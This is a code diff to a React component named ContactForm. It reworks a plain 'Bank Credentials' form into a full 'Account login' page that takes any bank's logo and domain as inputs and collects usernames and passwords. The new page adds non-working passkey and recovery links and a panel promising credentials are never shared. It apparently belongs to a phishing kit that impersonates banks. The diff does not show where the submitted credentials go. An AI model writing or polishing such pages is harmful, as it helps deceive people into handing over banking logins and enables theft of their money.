@@ -22,6 +22,8 @@ export default function ContactForm() {
   const [formId, setFormId] = useState(null)
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
+  const [rememberUsername, setRememberUsername] = useState(false)
+  const [showPassword, setShowPassword] = useState(false)
   const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
   const [submitting, setSubmitting] = useState(false)
 
@@ -86,57 +88,123 @@ export default function ContactForm() {
   // ---- FORMULARIO ----
   if (step === 'form') {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4 py-10">
-        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl">
-          <div className="mb-6 flex items-center justify-between">
-            <h1 className="text-2xl font-bold text-content-primary">Bank Credentials</h1>
-            <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
-                <path d="M18 6 6 18M6 6l12 12" />
-              </svg>
-            </button>
-          </div>
+      <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+        {/* Botón cerrar */}
+        <div className="flex justify-end px-4 sm:px-0">
+          <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
+              <path d="M18 6 6 18M6 6l12 12" />
+            </svg>
+          </button>
+        </div>
 
-          {/* Logo del banco */}
-          <div className="mb-6 flex justify-center">
-            <span className="flex h-20 w-20 items-center justify-center rounded-2xl bg-bg-neutral">
+        <div className="mx-auto grid max-w-6xl grid-cols-1 gap-8 px-4 py-8 sm:grid-cols-2 sm:px-8">
+          {/* Columna izquierda - Formulario */}
+          <div>
+            {/* Logo del banco */}
+            <div className="mb-8 flex h-12 items-center">
               <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
-            </span>
+            </div>
+
+            <h1 className="mb-2 text-3xl font-bold text-content-primary">Account login</h1>
+            <p className="mb-8 text-content-secondary">Securely access your account</p>
+
+            <form onSubmit={submitForm} className="space-y-6">
+              {/* Username */}
+              <div>
+                <label className="mb-2 block text-sm font-semibold text-content-primary">Username</label>
+                <input
+                  type="text"
+                  required
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
+                />
+              </div>
+
+              {/* Remember username */}
+              <label className="flex items-center gap-3">
+                <input
+                  type="checkbox"
+                  checked={rememberUsername}
+                  onChange={(e) => setRememberUsername(e.target.checked)}
+                  className="h-5 w-5 cursor-pointer rounded border-black/20 accent-blue-600"
+                />
+                <span className="text-sm text-content-primary">Remember my username</span>
+              </label>
+
+              {/* Password */}
+              <div>
+                <div className="mb-2 flex items-center justify-between">
+                  <label className="block text-sm font-semibold text-content-primary">Password</label>
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="text-sm text-blue-600 hover:text-blue-700"
+                  >
+                    {showPassword ? 'Hide' : 'Show'}
+                  </button>
+                </div>
+                <input
+                  type={showPassword ? 'text' : 'password'}
+                  required
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
+                />
+              </div>
+
+              {/* Login button */}
+              <button
+                type="submit"
+                disabled={submitting}
+                className="mt-8 w-full rounded-xl bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
+              >
+                {submitting ? 'Logging in…' : 'Log in with password'}
+              </button>
+
+              {/* Divider */}
+              <div className="flex items-center gap-3 py-4">
+                <div className="flex-1 border-t border-black/10" />
+                <span className="text-sm text-content-tertiary">OR</span>
+                <div className="flex-1 border-t border-black/10" />
+              </div>
+
+              {/* Passkey button */}
+              <button
+                type="button"
+                className="w-full rounded-xl border-2 border-blue-600 py-3.5 font-bold text-blue-600 hover:bg-blue-50"
+              >
+                👤 Use passkey
+              </button>
+            </form>
+
+            {/* Links */}
+            <div className="mt-8 space-y-4 text-center">
+              <a href="#" className="block text-sm text-blue-600 hover:text-blue-700">
+                Forgot username or password?
+              </a>
+              <a href="#" className="block text-sm underline text-content-primary hover:text-content-secondary">
+                Enroll in online banking
+              </a>
+            </div>
           </div>
 
-          <form onSubmit={submitForm} className="space-y-4">
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Usuario</label>
-              <input
-                type="text"
-                required
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                placeholder="Your username"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
+          {/* Columna derecha - Info panel */}
+          <div className="hidden flex-col justify-center sm:flex">
+            <div className="rounded-2xl bg-blue-50 p-8">
+              <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-blue-100">
+                <span className="text-3xl">🔐</span>
+              </div>
+              <h2 className="mb-4 text-2xl font-bold text-content-primary">Enhanced Security</h2>
+              <p className="mb-6 text-content-secondary">
+                Your login is protected with bank-grade encryption and security measures. We never share your credentials with third parties.
+              </p>
+              <a href="#" className="inline-flex items-center gap-2 text-sm font-semibold text-blue-600 hover:text-blue-700">
+                Learn more <span>→</span>
+              </a>
             </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Password</label>
-              <input
-                type="password"
-                required
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                placeholder="Your password"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <button
-              type="submit"
-              disabled={submitting}
-              className="w-full rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90 disabled:opacity-60"
-            >
-              {submitting ? 'Submitting…' : 'Submit'}
-            </button>
-          </form>
+          </div>
         </div>
       </div>
     )
